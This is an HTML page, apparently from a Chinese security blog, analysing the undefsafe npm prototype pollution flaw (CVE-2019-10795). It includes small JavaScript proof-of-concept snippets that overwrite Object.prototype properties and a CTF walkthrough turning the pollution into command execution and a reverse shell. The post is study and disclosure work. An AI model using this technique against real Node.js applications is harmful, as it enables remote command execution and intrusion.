@@ -1,0 +1,762 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="对于undefsafe模块原型链污染漏洞的调试分析+1道题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Undefsafe模块原型链污染(CVE-2019-10795)">
+<meta property="og:url" content="https://xianbeil.github.io/2022/03/14/undefsafeStudy/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="对于undefsafe模块原型链污染漏洞的调试分析+1道题">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314163648-1rj8xsa.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314164627-m957ud6.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314164658-3ce758g.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314170344-7zr9myg.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314170323-h605psv.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314170642-333nynu.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314170753-xafvitw.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314171433-mpolewd.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314172153-zspg5tw.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314170753-xafvitw.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314173929-iha79ex.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314174153-d64r37x.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314174447-4wfs9cy.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314175435-j6a5rgw.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314180158-vw4972y.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314180227-rw6l528.png">
+<meta property="article:published_time" content="2022-03-14T10:20:17.000Z">
+<meta property="article:modified_time" content="2022-04-22T10:40:56.733Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="node原型链污染">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314163648-1rj8xsa.png">
+  
+  
+  
+  <title>Undefsafe模块原型链污染(CVE-2019-10795) - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xianbeil.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Undefsafe模块原型链污染(CVE-2019-10795)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-03-14 18:20" pubdate>
+          2022年3月14日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          23 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Undefsafe模块原型链污染(CVE-2019-10795)</h1>
+            
+            <div class="markdown-body">
+              
+              <h1 id="undefsafe模块简介"><a href="#undefsafe模块简介" class="headerlink" title="undefsafe模块简介"></a>undefsafe模块简介</h1><p><a target="_blank" rel="noopener" href="https://www.npmjs.com/package/undefsafe">https://www.npmjs.com/package/undefsafe</a></p>
+<p>在低版本( &lt; 2.0.3 )存在原型链污染漏洞</p>
+<h2 id="npm安装存在漏洞的低版本"><a href="#npm安装存在漏洞的低版本" class="headerlink" title="npm安装存在漏洞的低版本"></a>npm安装存在漏洞的低版本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install --save undefsafe@2.0.0<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="解决报错"><a href="#解决报错" class="headerlink" title="解决报错"></a>解决报错</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;test&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">e</span>);<span class="hljs-comment">//test</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">a</span>.<span class="hljs-property">c</span>.<span class="hljs-property">e</span>);<span class="hljs-comment">//Uncaught TypeError TypeError: Cannot read properties of undefined (reading &#x27;e&#x27;)</span><br></code></pre></td></tr></table></figure>
+
+<p>当我们访问一个对象不存在的属性时，会报错然后退出程序，undefsafe帮我们解决了这个问题</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><br><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;test&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">undefsafe</span>(object,<span class="hljs-string">&quot;a.c.e&quot;</span>));<span class="hljs-comment">//undefined</span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="赋值操作"><a href="#赋值操作" class="headerlink" title="赋值操作"></a>赋值操作</h2><p>为一个不存在的属性赋值时，会在其上层赋值</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><br><br><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;test&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><br><span class="hljs-title function_">undefsafe</span>(object,<span class="hljs-string">&#x27;a.c.name&#x27;</span>,<span class="hljs-string">&#x27;xianbei&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314163648-1rj8xsa.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>当我们进行赋值操作，控制了第二个和第三个参数，便可以对对象的属性进行污染</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><br><br><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;test&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><br><span class="hljs-title function_">undefsafe</span>(object,<span class="hljs-string">&#x27;__proto__.name&#x27;</span>,<span class="hljs-string">&#x27;xianbei&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">name</span>);<span class="hljs-comment">//xianbei</span><br></code></pre></td></tr></table></figure>
+
+
+<p>但这还不够，通过这里的污染可以进一步攻击</p>
+<h2 id="污染Object的toString方法"><a href="#污染Object的toString方法" class="headerlink" title="污染Object的toString方法"></a>污染Object的toString方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><br><br><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;test&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot; &quot;</span>+object);<span class="hljs-comment">// to String hacked</span><br><span class="hljs-title function_">undefsafe</span>(object,<span class="hljs-string">&#x27;__proto__.toString&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;to String hacked&quot;</span>&#125;);<br><span class="hljs-comment">//undefsafe(object,&#x27;prototype.prototype.toString&#x27;,function()&#123;return &quot;to String hacked&quot;&#125;);</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot; &quot;</span>+object);<span class="hljs-comment">// to String hacked</span><br></code></pre></td></tr></table></figure>
+
+<p>JavaScript中，其实对象中的方法也就是一个属性，所以这里undefsafe在object中没有<code>toStr</code>ing方法，他就会往<code>object.__proto__</code>，也就是Object中查找，然后污染了Object对象中本来的toString函数。</p>
+<p>污染前：</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314164627-m957ud6.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>污染后：</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314164658-3ce758g.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h1 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h1><p>接下来下断点调试，还是使用上面的demo调试</p>
+<p>一开始初始化了一些变量</p>
+<p>用filter遍历数组parts，这里判断为false，赋值给star</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314170344-7zr9myg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>判断type，45行得知type就是传入的对象类型，而这里两个判断都不满足</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314170323-h605psv.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>对part进行遍历</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314170642-333nynu.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>中间的判断，key不为*所以跳过</p>
+<p>这里key为<code>__proto__</code>，obj为object对象，就获取到了<code>object.__proto__</code></p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314170753-xafvitw.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>第二次就是<code>object.__proto__.toString</code>，也就是Object对象的toString方法。</p>
+<p>然后就是赋值操作，这里对Object对象的属性进行了赋值，污染了原型属性</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314171433-mpolewd.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h1 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h1><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314172153-zspg5tw.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>getOwnPropertyNames判断对象自己所有的属性</p>
+<blockquote>
+<p> <strong><code>Object.getOwnPropertyNames()</code></strong> 方法返回一个由指定对象的所有自身属性的属性名（包括不可枚举属性但不包括Symbol值作为名称的属性）组成的数组。</p>
+</blockquote>
+<p>返回到上面一张图：</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314170753-xafvitw.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>此时key为<code>__proto__</code>,obj为object对象</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> i = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(object).<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;__proto__&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<span class="hljs-comment">//-1</span><br></code></pre></td></tr></table></figure>
+
+<p>更新之后会返回undefined</p>
+<h1 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h1><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314173929-iha79ex.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>构造函数Note中的方法<code>edit_note</code>，存在原型链污染漏洞，通过控制第二个和第三个参数我们似乎可以进行原型链污染</p>
+<p>找到edit_note路由，发现参数是可以控制的。</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314174153-d64r37x.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>下面就要找利用点，这里通过for in，来遍历commands里的命令然后作为exec的参数执行并返回结果</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314174447-4wfs9cy.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>可以看到，我们通过遍历输出了恶意命令输入</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314175435-j6a5rgw.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>for…in 循环只遍历可枚举属性（包括它的原型链上的可枚举属性）。像 Array和 Object使用内置构造函数所创建的对象都会继承自Object.prototype和String.prototype的不可枚举属性，例如 String 的 indexOf() 方法或 Object的toString()方法。循环将遍历对象本身的所有可枚举属性，以及对象从其构造函数原型中继承的属性（更接近原型链中对象的属性覆盖原型属性）。</p>
+</blockquote>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314180158-vw4972y.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>同样数组也适用</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314180227-rw6l528.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>所以说得多调试，多调试，多调试</p>
+</blockquote>
+<p>至此问题迎刃而解，直接反弹shell就行</p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/nodejsSec/" class="category-chain-item">nodejsSec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/node%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">#node原型链污染</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Undefsafe模块原型链污染(CVE-2019-10795)</div>
+      <div>https://xianbeil.github.io/2022/03/14/undefsafeStudy/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年3月14日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/15/cc1study2/" title="探索Ysoserial中的CC1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">探索Ysoserial中的CC1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/12/ysoAndUrldns/" title="URLDNS链分析">
+                        <span class="hidden-mobile">URLDNS链分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
